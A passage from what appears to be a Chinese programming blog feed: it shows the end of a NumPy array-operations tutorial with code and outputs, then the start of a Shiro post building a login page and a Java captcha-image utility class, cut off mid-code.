<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">所有小于<span class="number">5</span>的数都变成<span class="number">5</span> 所有大于<span class="number">9</span>的数都变成<span class="number">9</span>  中间的数就正常保留</span><br><span class="line">[[<span class="number">5</span> <span class="number">5</span> <span class="number">5</span> <span class="number">5</span>]</span><br><span class="line"> [<span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"> [<span class="number">9</span> <span class="number">9</span> <span class="number">9</span> <span class="number">9</span>]]</span><br></pre></td></tr></table></figure></p>
<h3 id="对列平均运算"><a href="#对列平均运算" class="headerlink" title="对列平均运算"></a>对列平均运算</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"对于列进行平均运算"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.mean(A,axis=<span class="number">0</span>)</span></span>) #对于列进行平均运算</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">对于列进行平均运算</span><br><span class="line">[<span class="number">6.</span> <span class="number">7.</span> <span class="number">8.</span> <span class="number">9.</span>]</span><br></pre></td></tr></table></figure></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">3</span>,<span class="number">15</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出第2行"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出第2行第1个元素"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[<span class="number">2</span>,<span class="number">1</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出第1行第1个元素"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[<span class="number">1</span>][<span class="number">1</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出第2行的所有数"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[<span class="number">2</span>,:])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出第1列的所有数"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[:,<span class="number">1</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>]</span><br><span class="line"> [ <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span>]</span><br><span class="line"> [<span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]]</span><br><span class="line">输出第<span class="number">2</span>行</span><br><span class="line">[<span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]</span><br><span class="line">输出第<span class="number">2</span>行第<span class="number">1</span>个元素</span><br><span class="line"><span class="number">12</span></span><br><span class="line">输出第<span class="number">1</span>行第<span class="number">1</span>个元素</span><br><span class="line"><span class="number">8</span></span><br><span class="line">输出第<span class="number">2</span>行的所有数</span><br><span class="line">[<span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]</span><br><span class="line">输出第<span class="number">1</span>列的所有数</span><br><span class="line">[ <span class="number">4</span>  <span class="number">8</span> <span class="number">12</span>]</span><br></pre></td></tr></table></figure></p>
<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">3</span>,<span class="number">15</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"转置后输出列"</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> column <span class="keyword">in</span> A<span class="selector-class">.T</span>:  #利用转置来输出</span><br><span class="line">    print(column)  #输出列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"输出行"</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> A:</span><br><span class="line">    print(row)  #输出行</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"迭代每一个元素以列表形式返回"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A.flatten()</span></span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"迭代每个元素"</span>)</span></span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> A<span class="selector-class">.flat</span>:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>]</span><br><span class="line"> [ <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span>]</span><br><span class="line"> [<span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]]</span><br><span class="line">转置后输出列</span><br><span class="line">[ <span class="number">3</span>  <span class="number">7</span> <span class="number">11</span>]</span><br><span class="line">[ <span class="number">4</span>  <span class="number">8</span> <span class="number">12</span>]</span><br><span class="line">[ <span class="number">5</span>  <span class="number">9</span> <span class="number">13</span>]</span><br><span class="line">[ <span class="number">6</span> <span class="number">10</span> <span class="number">14</span>]</span><br><span class="line">输出行</span><br><span class="line">[<span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line">[ <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span>]</span><br><span class="line">[<span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]</span><br><span class="line">迭代每一个元素以列表形式返回</span><br><span class="line">[ <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span>]</span><br><span class="line">迭代每个元素</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span></span><br></pre></td></tr></table></figure></p>
<h2 id="array的合并"><a href="#array的合并" class="headerlink" title="array的合并"></a>array的合并</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.array([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">B = np.array([<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"垂直合并"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.vstack((A,B)</span></span>))  #数组上下合并</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"水平合并"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.hstack((A,B)</span></span>)) #数组左右合并</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"行方面加了一个维度"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[np.newaxis,:])</span></span> #在行方面加了一个维度</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[np.newaxis,:].shape)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"列方面加了一个维度"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[:,np.newaxis])</span></span> #在列方面加了一个维度</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A[:,np.newaxis].shape)</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">垂直合并</span><br><span class="line">[[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">2</span> <span class="number">2</span> <span class="number">2</span>]]</span><br><span class="line">水平合并</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span>]</span><br><span class="line">行方面加了一个维度</span><br><span class="line">[[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]]</span><br><span class="line">(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">列方面加了一个维度</span><br><span class="line">[[<span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span>]]</span><br><span class="line">(<span class="number">3</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="多array合并"><a href="#多array合并" class="headerlink" title="多array合并"></a>多array合并</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">A = np.<span class="built_in">array</span>([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])[:,np.newaxis]</span><br><span class="line">B = np.<span class="built_in">array</span>([<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>])[:,np.newaxis]</span><br><span class="line"></span><br><span class="line">C = np.concatenate((A,B,B,A),axis=<span class="number">1</span>) #多个<span class="built_in">array</span>合并  axis=<span class="number">0</span>垂直合并  axis=<span class="number">1</span>水平合并</span><br><span class="line">print(C)</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">1</span>]]</span><br></pre></td></tr></table></figure></p>
<h2 id="array分割"><a href="#array分割" class="headerlink" title="array分割"></a>array分割</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">A = np.arange(12).reshape((3,4))</span><br><span class="line"><span class="builtin-name">print</span>(A)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"垂直分割"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(np.split(A,2,<span class="attribute">axis</span>=1)) #<span class="attribute">axis</span>=1 垂直分割</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"水平分割"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(np.split(A,3,<span class="attribute">axis</span>=0)) # <span class="attribute">axis</span>=0 水平分割</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"水平分割"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(np.vsplit(A,3)) #水平分割</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"垂直分割"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(np.hsplit(A,2)) #垂直分割</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]</span><br><span class="line"> [ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]]</span><br><span class="line">垂直分割</span><br><span class="line">[<span class="built_in">array</span>([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">       [<span class="number">8</span>, <span class="number">9</span>]]), <span class="built_in">array</span>([[ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>]])]</span><br><span class="line">水平分割</span><br><span class="line">[<span class="built_in">array</span>([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]), <span class="built_in">array</span>([[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]]), <span class="built_in">array</span>([[ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])]</span><br><span class="line">水平分割</span><br><span class="line">[<span class="built_in">array</span>([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]), <span class="built_in">array</span>([[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]]), <span class="built_in">array</span>([[ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])]</span><br><span class="line">垂直分割</span><br><span class="line">[<span class="built_in">array</span>([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">       [<span class="number">8</span>, <span class="number">9</span>]]), <span class="built_in">array</span>([[ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>]])]</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>数据分析</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2021/2/21-图形验证码</title>
    <url>/2021/02/21/Shiro-2020-2-21-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
    <content><![CDATA[<p><del>我是一只鸽子 咕咕咕</del></p>
<h1 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h1><p>图片验证码就不多介绍了<br>修改login.jsp<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html; UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/login"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> &gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        密码  : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        请输入验证码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"code"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/getImage"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>接下来就需要构建验证码的工具类<br>在utils下新建VerifyCodeUtils.java<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line">import javax.imageio.ImageIO;</span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.awt.geom.AffineTransform;</span><br><span class="line">import java.awt.image.BufferedImage;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *@创建人  cx</span></span><br><span class="line"><span class="comment"> *@创建时间  2018/11/27 17:36</span></span><br><span class="line"><span class="comment"> *@描述   验证码生成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="keyword">class</span> VerifyCodeUtils&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用到Algerian字体，系统里没有的话需要安装字体，字体只显示大写，去掉了1,0,i,o几个容易混淆的字符</span></span><br><span class="line">    public static final String VERIFY_CODES = <span class="string">"23456789ABCDEFGHJKLMNPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">private</span> static Random random = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用系统默认字符源生成验证码</span></span><br><span class="line"><span class="comment">     * @param verifySize    验证码长度</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String generate<span class="constructor">VerifyCode(<span class="params">int</span> <span class="params">verifySize</span>)</span>&#123;</span><br><span class="line">        return generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>, VERIFY_CODES)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用指定源生成验证码</span></span><br><span class="line"><span class="comment">     * @param verifySize    验证码长度</span></span><br><span class="line"><span class="comment">     * @param sources   验证码字符源</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String generate<span class="constructor">VerifyCode(<span class="params">int</span> <span class="params">verifySize</span>, String <span class="params">sources</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sources<span class="operator"> == </span>null<span class="operator"> || </span>sources.length<span class="literal">()</span><span class="operator"> == </span><span class="number">0</span>)&#123;</span><br><span class="line">            sources = VERIFY_CODES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> codesLen = sources.length<span class="literal">()</span>;</span><br><span class="line">        Random rand = <span class="keyword">new</span> <span class="constructor">Random(System.<span class="params">currentTimeMillis</span>()</span>);</span><br><span class="line">        StringBuilder verifyCode = <span class="keyword">new</span> <span class="constructor">StringBuilder(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; verifySize; i++)&#123;</span><br><span class="line">            verifyCode.append(sources.<span class="built_in">char</span><span class="constructor">At(<span class="params">rand</span>.<span class="params">nextInt</span>(<span class="params">codesLen</span>-1)</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        return verifyCode.<span class="keyword">to</span><span class="constructor">String()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成随机验证码文件,并返回验证码值</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param outputFile</span></span><br><span class="line"><span class="comment">     * @param verifySize</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String output<span class="constructor">VerifyImage(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, File <span class="params">outputFile</span>, <span class="params">int</span> <span class="params">verifySize</span>)</span> throws IOException&#123;</span><br><span class="line">        String verifyCode = generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">outputFile</span>, <span class="params">verifyCode</span>)</span>;</span><br><span class="line">        return verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 输出随机验证码图片流,并返回验证码值</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param os</span></span><br><span class="line"><span class="comment">     * @param verifySize</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String output<span class="constructor">VerifyImage(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, OutputStream <span class="params">os</span>, <span class="params">int</span> <span class="params">verifySize</span>)</span> throws IOException&#123;</span><br><span class="line">        String verifyCode = generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">os</span>, <span class="params">verifyCode</span>)</span>;</span><br><span class="line">        return verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成指定验证码图像文件</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param outputFile</span></span><br><span class="line"><span class="comment">     * @param code</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static void output<span class="constructor">Image(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, File <span class="params">outputFile</span>, String <span class="params">code</span>)</span> throws IOException&#123;</span><br><span class="line">        <span class="keyword">if</span>(outputFile<span class="operator"> == </span>null)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        File dir = outputFile.get<span class="constructor">ParentFile()</span>;</span><br><span class="line">        <span class="keyword">if</span>(!dir.exists<span class="literal">()</span>)&#123;</span><br><span class="line">            dir.mkdirs<span class="literal">()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            outputFile.create<span class="constructor">NewFile()</span>;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> <span class="constructor">FileOutputStream(<span class="params">outputFile</span>)</span>;</span><br><span class="line">            output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">fos</span>, <span class="params">code</span>)</span>;</span><br><span class="line">            fos.close<span class="literal">()</span>;</span><br><span class="line">        &#125; catch(IOException e)&#123;</span><br><span class="line">            throw e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 输出指定验证码图片流</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param os</span></span><br><span class="line"><span class="comment">     * @param code</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static void output<span class="constructor">Image(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, OutputStream <span class="params">os</span>, String <span class="params">code</span>)</span> throws IOException&#123;</span><br><span class="line">        <span class="built_in">int</span> verifySize = code.length<span class="literal">()</span>;</span><br><span class="line">        BufferedImage image = <span class="keyword">new</span> <span class="constructor">BufferedImage(<span class="params">w</span>, <span class="params">h</span>, BufferedImage.TYPE_INT_RGB)</span>;</span><br><span class="line">        Random rand = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line">        Graphics2D g2 = image.create<span class="constructor">Graphics()</span>;</span><br><span class="line">        g2.set<span class="constructor">RenderingHint(RenderingHints.KEY_ANTIALIASING,RenderingHints.VALUE_ANTIALIAS_ON)</span>;</span><br><span class="line">        Color<span class="literal">[]</span> colors = <span class="keyword">new</span> Color<span class="literal">[<span class="number">5</span>]</span>;</span><br><span class="line">        Color<span class="literal">[]</span> colorSpaces = <span class="keyword">new</span> Color<span class="literal">[]</span> &#123; Color.WHITE, Color.CYAN,</span><br><span class="line">                Color.GRAY, Color.LIGHT_GRAY, Color.MAGENTA, Color.ORANGE,</span><br><span class="line">                Color.PINK, Color.YELLOW &#125;;</span><br><span class="line">        <span class="built_in">float</span><span class="literal">[]</span> fractions = <span class="keyword">new</span> <span class="built_in">float</span><span class="literal">[<span class="identifier">colors</span>.<span class="identifier">length</span>]</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; colors.length; i++)&#123;</span><br><span class="line">            colors<span class="literal">[<span class="identifier">i</span>]</span> = colorSpaces<span class="literal">[<span class="identifier">rand</span>.<span class="identifier">nextInt</span>(<span class="identifier">colorSpaces</span>.<span class="identifier">length</span>)]</span>;</span><br><span class="line">            fractions<span class="literal">[<span class="identifier">i</span>]</span> = rand.next<span class="constructor">Float()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">Arrays</span>.</span></span>sort(fractions);</span><br><span class="line"></span><br><span class="line">        g2.set<span class="constructor">Color(Color.GRAY)</span>;<span class="comment">// 设置边框色</span></span><br><span class="line">        g2.fill<span class="constructor">Rect(0, 0, <span class="params">w</span>, <span class="params">h</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Color c = get<span class="constructor">RandColor(200, 250)</span>;</span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">c</span>)</span>;<span class="comment">// 设置背景色</span></span><br><span class="line">        g2.fill<span class="constructor">Rect(0, 2, <span class="params">w</span>, <span class="params">h</span>-4)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绘制干扰线</span></span><br><span class="line">        Random random = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">getRandColor</span>(160, 